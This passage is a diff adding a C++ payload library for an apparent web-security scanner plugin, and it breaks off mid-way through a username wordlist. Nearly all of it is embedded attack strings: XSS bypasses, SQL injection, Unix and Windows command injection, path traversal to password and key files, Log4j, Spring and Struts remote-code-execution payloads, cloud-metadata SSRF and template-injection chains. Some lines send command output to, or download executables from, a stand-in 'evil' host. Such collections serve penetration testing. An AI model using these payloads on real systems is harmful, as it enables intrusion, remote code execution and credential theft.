@@ -1,0 +1,1029 @@
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <shlobj.h>
+
+#ifdef small
+#undef small
+#endif
+
+#include "payload_library.hpp"
+
+#include "helpers/diag_log.hpp"
+
+#include <algorithm>
+#include <atomic>
+#include <cstring>
+#include <filesystem>
+#include <fstream>
+#include <mutex>
+#include <sstream>
+#include <unordered_map>
+
+namespace aida {
+namespace burp {
+namespace payloads {
+
+namespace {
+
+struct state_t
+{
+    std::mutex                                          mtx;
+    std::unordered_map<std::string, payload_set_t>      sets;
+    std::atomic<bool>                                   initialized{false};
+    std::mutex                                          err_mtx;
+    std::string                                         last_err;
+};
+
+state_t& s() { static state_t st; return st; }
+
+void set_err(const std::string& msg)
+{
+    auto& st = s();
+    std::lock_guard<std::mutex> lk(st.err_mtx);
+    st.last_err = msg;
+}
+
+std::vector<std::string> split_lines(const char* blob)
+{
+    std::vector<std::string> out;
+    if (!blob) return out;
+    const char* p = blob;
+    std::string cur;
+    while (*p)
+    {
+        if (*p == '\n')
+        {
+            if (!cur.empty()) out.push_back(cur);
+            cur.clear();
+        }
+        else if (*p != '\r')
+        {
+            cur.push_back(*p);
+        }
+        ++p;
+    }
+    if (!cur.empty()) out.push_back(cur);
+    return out;
+}
+
+std::string sanitize_set_id(const std::string& id)
+{
+    std::string out;
+    out.reserve(id.size());
+    for (char c : id)
+    {
+        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
+            c == '_' || c == '-' || c == '/' || c == '.')
+            out.push_back(c);
+        else
+            out.push_back('_');
+    }
+    return out;
+}
+
+std::string storage_path_for(const std::string& id)
+{
+    std::string flat = sanitize_set_id(id);
+    std::replace(flat.begin(), flat.end(), '/', '_');
+    return storage_dir() + flat + ".txt";
+}
+
+static const char* kXssPolyglot =
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>\n"
+    "<svg onload=alert(1)>\n"
+    "<img src=x onerror=alert(1)>\n"
+    "<script>alert(1)</script>\n"
+    "\"><script>alert(1)</script>\n"
+    "'><script>alert(1)</script>\n"
+    "</title><script>alert(1)</script>\n"
+    "</textarea><script>alert(1)</script>\n"
+    "</style><script>alert(1)</script>\n"
+    "javascript:alert(1)\n"
+    "data:text/html,<script>alert(1)</script>\n"
+    "<iframe src=javascript:alert(1)>\n"
+    "<body onload=alert(1)>\n"
+    "<details open ontoggle=alert(1)>\n"
+    "<marquee onstart=alert(1)>\n"
+    "<input autofocus onfocus=alert(1)>\n"
+    "<svg><script>alert&#40;1&#41;</script>\n"
+    "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src onerror=alert(1)>\">\n"
+    "<a href=\"javascript:alert(1)\">click</a>\n"
+    "<form action=javascript:alert(1)><input type=submit>\n"
+    "<isindex action=javascript:alert(1) type=submit value=click>\n"
+    ;
+
+static const char* kXssStandard =
+    "<script>alert('XSS')</script>\n"
+    "<script>alert(String.fromCharCode(88,83,83))</script>\n"
+    "<script src=//evil/x></script>\n"
+    "<img src=x onerror=alert(1)>\n"
+    "<img src=javascript:alert(1)>\n"
+    "<img src=\"javascript:alert(1)\">\n"
+    "<img src=`javascript:alert(1)`>\n"
+    "<img src=\"javascript:alert(&quot;1&quot;)\">\n"
+    "<IMG SRC=jav&#x09;ascript:alert(1)>\n"
+    "<IMG SRC=jav&#x0A;ascript:alert(1)>\n"
+    "<IMG SRC=jav&#x0D;ascript:alert(1)>\n"
+    "<svg onload=alert(1)>\n"
+    "<svg/onload=alert(1)>\n"
+    "<svg><script>alert(1)</script></svg>\n"
+    "<body onload=alert(1)>\n"
+    "<body/onload=alert(1)>\n"
+    "<body background=javascript:alert(1)>\n"
+    "<iframe src=javascript:alert(1)>\n"
+    "<iframe srcdoc=\"<script>alert(1)</script>\">\n"
+    "<input onfocus=alert(1) autofocus>\n"
+    "<input onblur=alert(1) autofocus><input autofocus>\n"
+    "<keygen autofocus onfocus=alert(1)>\n"
+    "<video><source onerror=alert(1)>\n"
+    "<audio src=x onerror=alert(1)>\n"
+    "<details open ontoggle=alert(1)>\n"
+    "<marquee onstart=alert(1)>\n"
+    "<select autofocus onfocus=alert(1)>\n"
+    "<textarea autofocus onfocus=alert(1)>\n"
+    "<a href=\"javascript:alert(1)\">x</a>\n"
+    "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>\n"
+    "<form><button formaction=javascript:alert(1)>x\n"
+    "<isindex action=javascript:alert(1) type=image>\n"
+    "<object data=javascript:alert(1)>\n"
+    "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>\n"
+    "<embed src=javascript:alert(1)>\n"
+    "<embed src=//evil/x>\n"
+    "<math><a xlink:href=javascript:alert(1)>x</math>\n"
+    "<table background=javascript:alert(1)>\n"
+    "<base href=javascript:alert(1);// />\n"
+    "\"><svg/onload=alert(1)//\n"
+    "'><svg/onload=alert(1)//\n"
+    "\";alert(1);//\n"
+    "';alert(1);//\n"
+    "`;alert(1);//\n"
+    "</script><script>alert(1)</script>\n"
+    "</title><svg/onload=alert(1)>\n"
+    "</textarea><svg/onload=alert(1)>\n"
+    "</style><svg/onload=alert(1)>\n"
+    "</noscript><svg/onload=alert(1)>\n"
+    "</template><svg/onload=alert(1)>\n"
+    "{{constructor.constructor('alert(1)')()}}\n"
+    "{{$on.constructor('alert(1)')()}}\n"
+    "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}\n"
+    "${alert(1)}\n"
+    "${{constructor.constructor('alert(1)')()}}\n"
+    "#{alert(1)}\n"
+    "{{7*7}}\n"
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
+    "javascript://-->\");alert(1);//\n"
+    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//\n"
+    "javascript:eval('alert(1)')\n"
+    "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n"
+    "vbscript:msgbox(\"XSS\")\n"
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">\n"
+    "<!--><script>alert(1)</script -->\n"
+    "<style>@import 'javascript:alert(1)';</style>\n"
+    "<style>body{background:url(\"javascript:alert(1)\")}</style>\n"
+    "<link rel=stylesheet href=javascript:alert(1)>\n"
+    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>\n"
+    "<svg><animateTransform onbegin=alert(1) attributeName=transform>\n"
+    "<svg><set onbegin=alert(1) attributeName=x to=y>\n"
+    "<svg><discard onbegin=alert(1)>\n"
+    "<xss id=x tabindex=1 onactivate=alert(1)></xss>\n"
+    "<xss style=\"behavior:url(#default#userData)\" id=x>\n"
+    "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script>\n"
+    "<dialog open ontoggle=alert(1)>\n"
+    "<frameset><frame src=javascript:alert(1)>\n"
+    "<frame src=javascript:alert(1)>\n"
+    "<applet code=javascript:alert(1)>\n"
+    "<menuitem onclick=alert(1)>x\n"
+    "<svg><g onload=alert(1)></g></svg>\n"
+    "<svg><image href=x onerror=alert(1)>\n"
+    "<svg><use href=#x onload=alert(1)>\n"
+    "<svg><a><circle r=400></circle><text x=10 y=20>x</text><animate attributeName=href values=javascript:alert(1) /></a>\n"
+    "<x onclick=alert(1) onkeydown=alert(1) onmouseover=alert(1)>x</x>\n"
+    "<a onclick=alert(1) href=#>x</a>\n"
+    "%3Cscript%3Ealert(1)%3C/script%3E\n"
+    "%253Cscript%253Ealert(1)%253C/script%253E\n"
+    "<script>alert(1)</script>\n"
+    "&lt;script&gt;alert(1)&lt;/script&gt;\n"
+    "&#60;script&#62;alert(1)&#60;/script&#62;\n"
+    "<scr<script>ipt>alert(1)</scr</script>ipt>\n"
+    "<svg><script>123<a>alert(1)</script></svg>\n"
+    "<SCRIPT>alert('XSS')</SCRIPT>\n"
+    "<ScRiPt>alert(1)</ScRiPt>\n"
+    "<script\x20type=\"text/javascript\">alert(1)</script>\n"
+    "<script\x09>alert(1)</script>\n"
+    "<script\x0c>alert(1)</script>\n"
+    "<script>/* */alert(1)/* */</script>\n"
+    "<script>void/* */alert(1)</script>\n"
+    "<script>setTimeout('alert(1)',0)</script>\n"
+    "<script>setInterval('alert(1)',999)</script>\n"
+    "<script>Function('alert(1)')()</script>\n"
+    "<script>new Function('alert(1)')()</script>\n"
+    "<script>window['alert'](1)</script>\n"
+    "<script>this['alert'](1)</script>\n"
+    "<script>(()=>{alert(1)})()</script>\n"
+    "<script>eval(atob('YWxlcnQoMSk='))</script>\n"
+    ;
+
+static const char* kSqliError =
+    "'\n"
+    "\"\n"
+    "`\n"
+    "''\n"
+    "'\"\n"
+    "\\\n"
+    "')\n"
+    "'))\n"
+    "''')\n"
+    "' OR '1'='1\n"
+    "\" OR \"1\"=\"1\n"
+    "' OR 1=1--\n"
+    "' OR 1=1#\n"
+    "' OR 1=1/*\n"
+    "admin'--\n"
+    "admin'#\n"
+    "admin'/*\n"
+    "' UNION SELECT NULL--\n"
+    "' UNION SELECT NULL,NULL--\n"
+    "' UNION SELECT NULL,NULL,NULL--\n"
+    "' AND extractvalue(1, concat(0x7e, version()))-- -\n"
+    "' AND updatexml(1, concat(0x7e, version(), 0x7e), 1)-- -\n"
+    "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -\n"
+    "' AND 1=CONVERT(int,@@version)--\n"
+    "' AND CAST((SELECT @@version) AS int)--\n"
+    "'; EXEC sp_who--\n"
+    "'; DROP TABLE x--\n"
+    "' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(6765=6765,1))),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -\n"
+    "'+(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)+'\n"
+    "1 AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))\n"
+    "1 AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))\n"
+    "1; SELECT pg_sleep(0)--\n"
+    "1 AND 1=cast(pg_sleep(0) as text)--\n"
+    "1' AND 1=cast(version() as integer)--\n"
+    "1' AND extractvalue(rand(),concat(0x3a,(SELECT user())))-- -\n"
+    "'; SELECT json_extract(load_extension('libsqlite3.so')); --\n"
+    "'); SELECT CASE WHEN (1=1) THEN 1 ELSE cast(1/0 as int) END--\n"
+    ;
+
+static const char* kSqliBoolean =
+    "' AND '1'='1\n"
+    "' AND '1'='2\n"
+    "1 AND 1=1\n"
+    "1 AND 1=2\n"
+    "' OR '1'='1' --\n"
+    "' OR '1'='2' --\n"
+    "1) AND 1=1--\n"
+    "1) AND 1=2--\n"
+    "1)) AND 1=1--\n"
+    "1)) AND 1=2--\n"
+    "1' AND SUBSTRING((SELECT @@version),1,1)='5\n"
+    "1' AND SUBSTRING((SELECT @@version),1,1)='Z\n"
+    "1' AND ASCII(SUBSTRING(@@version,1,1))>0--\n"
+    "1' AND ASCII(SUBSTRING(@@version,1,1))<0--\n"
+    "1' AND LENGTH(database())>0--\n"
+    "1' AND LENGTH(database())<0--\n"
+    "' OR NOT '1'='2\n"
+    "' OR EXISTS(SELECT 1)--\n"
+    "' OR NOT EXISTS(SELECT 1)--\n"
+    "' AND 'a'='a\n"
+    "' AND 'a'='b\n"
+    ;
+
+static const char* kSqliTime =
+    "' AND SLEEP(5)-- -\n"
+    "' OR SLEEP(5)-- -\n"
+    "'; SELECT SLEEP(5)-- -\n"
+    "'; WAITFOR DELAY '0:0:5'-- -\n"
+    "1; WAITFOR DELAY '0:0:5'-- -\n"
+    "1 AND IF(1=1, SLEEP(5), 0)-- -\n"
+    "1; SELECT pg_sleep(5)--\n"
+    "1 AND pg_sleep(5)--\n"
+    "1' AND pg_sleep(5)--\n"
+    "1' UNION SELECT pg_sleep(5)--\n"
+    "1; SELECT IF(1=1, SLEEP(5), 0)--\n"
+    "1; SELECT BENCHMARK(5000000, MD5('a'))--\n"
+    "1' AND BENCHMARK(5000000,MD5('a'))-- -\n"
+    "1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0, SLEEP(5), 0)-- -\n"
+    "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--\n"
+    "1; SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--\n"
+    "1' AND dbms_pipe.receive_message(('a'),5)-- -\n"
+    "1' AND (SELECT CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END)-- -\n"
+    "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -\n"
+    ;
+
+static const char* kCmdiUnix =
+    "; id\n"
+    "; uname -a\n"
+    "; cat /etc/passwd\n"
+    "; ls -la\n"
+    "| id\n"
+    "| uname -a\n"
+    "& id\n"
+    "&& id\n"
+    "&&id\n"
+    "|| id\n"
+    "`id`\n"
+    "$(id)\n"
+    "$(`id`)\n"
+    "\";id\n"
+    "';id\n"
+    "; sleep 5\n"
+    "| sleep 5\n"
+    "&& sleep 5\n"
+    "`sleep 5`\n"
+    "$(sleep 5)\n"
+    ";`sleep 5`\n"
+    "; ping -c 5 127.0.0.1\n"
+    "| ping -c 5 127.0.0.1\n"
+    "; curl http://evil/$(id|base64)\n"
+    "; wget http://evil/$(id|base64)\n"
+    "%0a id\n"
+    "%0a sleep 5\n"
+    "\";sleep 5;\"\n"
+    "';sleep 5;'\n"
+    "{cat,/etc/passwd}\n"
+    "/???/c?t /etc/passwd\n"
+    "/bin/sh -c id\n"
+    "/bin/bash -c id\n"
+    ";${IFS}id\n"
+    "%26id%26\n"
+    "%7Cid\n"
+    "%3Bsleep+5\n"
+    ;
+
+static const char* kCmdiWindows =
+    "& whoami\n"
+    "&& whoami\n"
+    "| whoami\n"
+    "|| whoami\n"
+    "& dir\n"
+    "&& dir\n"
+    "| dir\n"
+    "& systeminfo\n"
+    "& ipconfig\n"
+    "& net user\n"
+    "& net localgroup administrators\n"
+    "& type c:\\windows\\win.ini\n"
+    "& powershell -c whoami\n"
+    "& powershell -enc dwBoAG8AYQBtAGkA\n"
+    "& certutil -urlcache -split -f http://evil/x x.exe\n"
+    "& bitsadmin /transfer x /priority foreground http://evil/x.exe c:\\x.exe\n"
+    "& ping -n 5 127.0.0.1\n"
+    "& timeout /t 5\n"
+    "& choice /d y /t 5 > nul\n"
+    "%0a& whoami\n"
+    "%0d%0a& whoami\n"
+    "; whoami\n"
+    "; dir\n"
+    "; type c:\\windows\\win.ini\n"
+    "& cmd /c whoami\n"
+    "& cmd.exe /c whoami\n"
+    "& findstr /si pass *.ini *.txt\n"
+    ;
+
+static const char* kLfiUnix =
+    "/etc/passwd\n"
+    "../etc/passwd\n"
+    "../../etc/passwd\n"
+    "../../../etc/passwd\n"
+    "../../../../etc/passwd\n"
+    "../../../../../etc/passwd\n"
+    "../../../../../../etc/passwd\n"
+    "../../../../../../../etc/passwd\n"
+    "../../../../../../../../etc/passwd\n"
+    "../../../../../../../../../etc/passwd\n"
+    "../../../../../../../../../../etc/passwd\n"
+    "/etc/shadow\n"
+    "/etc/hostname\n"
+    "/etc/hosts\n"
+    "/etc/resolv.conf\n"
+    "/etc/issue\n"
+    "/etc/group\n"
+    "/etc/profile\n"
+    "/etc/motd\n"
+    "/proc/self/environ\n"
+    "/proc/self/cmdline\n"
+    "/proc/self/cwd\n"
+    "/proc/self/exe\n"
+    "/proc/self/status\n"
+    "/proc/version\n"
+    "/proc/cpuinfo\n"
+    "/proc/mounts\n"
+    "/var/log/auth.log\n"
+    "/var/log/syslog\n"
+    "/var/log/apache2/access.log\n"
+    "/var/log/apache2/error.log\n"
+    "/var/log/nginx/access.log\n"
+    "/var/log/nginx/error.log\n"
+    "/var/log/httpd/access_log\n"
+    "/var/log/httpd/error_log\n"
+    "/var/spool/mail/root\n"
+    "/root/.bash_history\n"
+    "/root/.ssh/id_rsa\n"
+    "/root/.ssh/authorized_keys\n"
+    "/home/user/.bash_history\n"
+    "/home/user/.ssh/id_rsa\n"
+    "/usr/local/etc/php.ini\n"
+    "/etc/apache2/apache2.conf\n"
+    "/etc/nginx/nginx.conf\n"
+    "/etc/httpd/conf/httpd.conf\n"
+    "file:///etc/passwd\n"
+    "php://filter/convert.base64-encode/resource=/etc/passwd\n"
+    "php://filter/read=convert.base64-encode/resource=index.php\n"
+    "php://input\n"
+    "data://text/plain,id\n"
+    "expect://id\n"
+    "zip://test.zip%23inner.txt\n"
+    "..%2f..%2f..%2fetc%2fpasswd\n"
+    "..%252f..%252f..%252fetc%252fpasswd\n"
+    "....//....//....//etc/passwd\n"
+    "....\\/....\\/....\\/etc/passwd\n"
+    "..%c0%af..%c0%afetc%c0%afpasswd\n"
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n"
+    "..%5c..%5c..%5cetc%5cpasswd\n"
+    "/etc/passwd%00\n"
+    "/etc/passwd%2500\n"
+    "/etc/passwd?\n"
+    "/etc/passwd%23\n"
+    ;
+
+static const char* kLfiWindows =
+    "C:\\windows\\win.ini\n"
+    "C:\\boot.ini\n"
+    "..\\windows\\win.ini\n"
+    "..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
+    "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
+    "/windows/win.ini\n"
+    "../windows/win.ini\n"
+    "../../windows/win.ini\n"
+    "../../../windows/win.ini\n"
+    "../../../../windows/win.ini\n"
+    "../../../../../windows/win.ini\n"
+    "C:\\windows\\system32\\drivers\\etc\\hosts\n"
+    "../windows/system32/drivers/etc/hosts\n"
+    "../../windows/system32/drivers/etc/hosts\n"
+    "C:\\windows\\repair\\sam\n"
+    "C:\\windows\\repair\\system\n"
+    "C:\\windows\\debug\\NetSetup.log\n"
+    "C:\\windows\\system.ini\n"
+    "C:\\windows\\panther\\unattend.xml\n"
+    "C:\\windows\\panther\\unattended.xml\n"
+    "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_extend.log\n"
+    "C:\\xampp\\apache\\logs\\access.log\n"
+    "C:\\xampp\\apache\\logs\\error.log\n"
+    "C:\\xampp\\php\\php.ini\n"
+    "C:\\windows\\system32\\inetsrv\\config\\applicationHost.config\n"
+    "C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadLine\\ConsoleHost_history.txt\n"
+    "..%5cwindows%5cwin.ini\n"
+    "..%252fwindows%252fwin.ini\n"
+    "..%c0%5cwindows%c0%5cwin.ini\n"
+    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\n"
+    "C:\\windows\\win.ini%00\n"
+    ;
+
+static const char* kRceLog4j =
+    "${jndi:ldap://AIDA_OOB/x}\n"
+    "${jndi:rmi://AIDA_OOB/x}\n"
+    "${jndi:dns://AIDA_OOB/x}\n"
+    "${jndi:ldaps://AIDA_OOB/x}\n"
+    "${jndi:iiop://AIDA_OOB/x}\n"
+    "${jndi:corba://AIDA_OOB/x}\n"
+    "${jndi:nis://AIDA_OOB/x}\n"
+    "${jndi:nds://AIDA_OOB/x}\n"
+    "${jndi:http://AIDA_OOB/x}\n"
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://AIDA_OOB/x}\n"
+    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//AIDA_OOB/x}\n"
+    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://AIDA_OOB/x}\n"
+    "${jndi:${upper:l}${upper:d}${upper:a}${upper:p}://AIDA_OOB/x}\n"
+    "${j${k8s:k5:-ND}i:ldap://AIDA_OOB/x}\n"
+    "${j${::-n}d${::-i}:ldap://AIDA_OOB/x}\n"
+    "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://AIDA_OOB/x}\n"
+    "${${${::-j}}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://AIDA_OOB/x}\n"
+    "${${::-${::-j}}${::-${::-n}}${::-${::-d}}${::-${::-i}}:${::-${::-l}}${::-${::-d}}${::-${::-a}}${::-${::-p}}://AIDA_OOB/x}\n"
+    "${${env:BARFOO:-j}${env:BARFOO:-n}${env:BARFOO:-d}${env:BARFOO:-i}:${env:BARFOO:-l}${env:BARFOO:-d}${env:BARFOO:-a}${env:BARFOO:-p}://AIDA_OOB/x}\n"
+    ;
+
+static const char* kRceSpring =
+    "${T(java.lang.Runtime).getRuntime().exec('id')}\n"
+    "${T(java.lang.Runtime).getRuntime().exec('whoami')}\n"
+    "${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}\n"
+    "${@java.lang.Runtime@getRuntime().exec('id')}\n"
+    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n"
+    "?class.module.classLoader.URLs[0]=0\n"
+    "T(java.lang.Runtime).getRuntime().exec('id')\n"
+    "%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D\n"
+    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n"
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
+    "*{T(java.lang.Runtime).getRuntime().exec('id')}\n"
+    ;
+
+static const char* kRceStruts =
+    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n"
+    "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#x=@java.lang.Runtime@getRuntime().exec('id')}\n"
+    "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@java.lang.Runtime@getRuntime().exec('id'))}\n"
+    "/struts/webconsole.html\n"
+    "/struts/dojo/runtime.html\n"
+    "redirect:${'%24%7BT(java.lang.Runtime).getRuntime().exec(\"id\")%7D'}\n"
+    "action:${'%24%7BT(java.lang.Runtime).getRuntime().exec(\"id\")%7D'}\n"
+    ;
+
+static const char* kSsrfCloud =
+    "http://169.254.169.254/\n"
+    "http://169.254.169.254/latest/\n"
+    "http://169.254.169.254/latest/meta-data/\n"
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
+    "http://169.254.169.254/latest/user-data/\n"
+    "http://169.254.169.254/latest/dynamic/instance-identity/document\n"
+    "http://169.254.170.2/v2/credentials/\n"
+    "http://metadata.google.internal/\n"
+    "http://metadata.google.internal/computeMetadata/v1/\n"
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n"
+    "http://metadata.google.internal/computeMetadata/v1/project/project-id\n"
+    "http://metadata/computeMetadata/v1/instance/service-accounts/default/token\n"
+    "http://100.100.100.200/latest/meta-data/\n"
+    "http://192.0.0.192/latest/meta-data/\n"
+    "http://169.254.169.254/metadata/v1/maintenance\n"
+    "http://169.254.169.254/openstack/latest/meta_data.json\n"
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
+    "http://[::ffff:169.254.169.254]/latest/meta-data/\n"
+    "http://0177.0.0.376/latest/meta-data/\n"
+    "http://2852039166/latest/meta-data/\n"
+    "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/\n"
+    "http://169.254.169.254.nip.io/latest/meta-data/\n"
+    ;
+
+static const char* kSsrfLoopback =
+    "http://localhost/\n"
+    "http://127.0.0.1/\n"
+    "http://127.1/\n"
+    "http://0/\n"
+    "http://0.0.0.0/\n"
+    "http://[::]/\n"
+    "http://[::1]/\n"
+    "http://[0:0:0:0:0:ffff:127.0.0.1]/\n"
+    "http://2130706433/\n"
+    "http://0x7f000001/\n"
+    "http://0177.0.0.1/\n"
+    "http://127.0.0.1:22/\n"
+    "http://127.0.0.1:80/\n"
+    "http://127.0.0.1:443/\n"
+    "http://127.0.0.1:3306/\n"
+    "http://127.0.0.1:6379/\n"
+    "http://127.0.0.1:5432/\n"
+    "http://127.0.0.1:9200/\n"
+    "http://127.0.0.1:11211/\n"
+    "http://127.0.0.1:27017/\n"
+    "http://localhost.attacker.com/\n"
+    "http://attacker.com#@127.0.0.1/\n"
+    "http://attacker.com@127.0.0.1/\n"
+    "http://127.0.0.1.attacker.com/\n"
+    "gopher://127.0.0.1:6379/_INFO\n"
+    "gopher://127.0.0.1:25/_HELO%20a\n"
+    "file:///etc/passwd\n"
+    "file:///c:/windows/win.ini\n"
+    "dict://127.0.0.1:11211/stats\n"
+    "ldap://127.0.0.1/\n"
+    "tftp://127.0.0.1/\n"
+    ;
+
+static const char* kSstiAll =
+    "{{7*7}}\n"
+    "${7*7}\n"
+    "#{7*7}\n"
+    "*{7*7}\n"
+    "{{7*'7'}}\n"
+    "${{7*7}}\n"
+    "@{7*7}\n"
+    "{7*7}\n"
+    "<%= 7*7 %>\n"
+    "{{=7*7}}\n"
+    "{{config}}\n"
+    "{{config.items()}}\n"
+    "{{request}}\n"
+    "{{self}}\n"
+    "{{settings}}\n"
+    "{{settings.SECRET_KEY}}\n"
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
+    "{{cycler.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{joiner.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{namespace.__init__.__globals__.os.popen('id').read()}}\n"
+    "{{lipsum.__globals__.os.popen('id').read()}}\n"
+    "{{''.__class__.__mro__[1].__subclasses__()}}\n"
+    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n"
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n"
+    "{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}\n"
+    "${T(java.lang.Runtime).getRuntime().exec('id')}\n"
+    "${@java.lang.Runtime@getRuntime().exec('id')}\n"
+    "*{T(java.lang.Runtime).getRuntime().exec('id')}\n"
+    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n"
+    "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream()}\n"
+    "${(new java.io.BufferedReader(new java.io.InputStreamReader((new java.lang.ProcessBuilder('id').redirectErrorStream(true).start()).getInputStream()))).readLine()}\n"
+    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]\n"
+    "[(${T(java.lang.Runtime).getRuntime().exec('id')})]\n"
+    "<%= system('id') %>\n"
+    "<%= `id` %>\n"
+    "<%= File.read('/etc/passwd') %>\n"
+    "<%= File.open('/etc/passwd').read %>\n"
+    "<%= Dir.entries('/') %>\n"
+    "{{constructor.constructor('alert(1)')()}}\n"
+    "{{$on.constructor('alert(1)')()}}\n"
+    "{{toString.constructor('alert(1)')()}}\n"
+    "{%for c in [1,2,3]%}{{c,c,c}}{%endfor%}\n"
+    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/hostname').read() }}\n"
+    ;
+
+static const char* kAuthUsernamesTop1000 =
+    "admin\nadministrator\nroot\nuser\ntest\nguest\nsupport\nservice\nsa\noracle\npostgres\nmysql\nsqlserver\nbackup\nweb\nwww\napp\nstaff\nmanager\nsecretary\ndemo\ndaemon\nbin\nnobody\noperator\nftp\nmail\nsmtp\npop3\nimap\ndns\nnamed\nbind\ngames\nlist\nirc\nnews\nman\nproxy\nlp\nuucp\nrpm\nrpc\napache\nhttpd\nnginx\nlighttpd\ntomcat\njboss\nweblogic\nwebsphere\nmongo\nmongodb\nredis\ncouchdb\nelasticsearch\nmemcache\nmemcached\ncassandra\nrabbitmq\nactivemq\nzookeeper\nkafka\nstorm\nspark\nhadoop\nhdfs\nyarn\nhbase\nhive\npig\nimpala\noozie\nhue\nsentry\nranger\natlas\nzeppelin\njupyter\nrstudio\ndatabricks\nsnowflake\nredshift\nbigquery\ndatabase\ndb\ndba\ndev\ndeveloper\nqa\nstage\nstaging\nprod\nproduction\nrelease\ntest1\ntest2\ntestuser\ntester\ndefault\nany\nany1\ndomain\nlogin\nlogon\naccount\ncustomer\nclient\nbuyer\nseller\nvendor\npart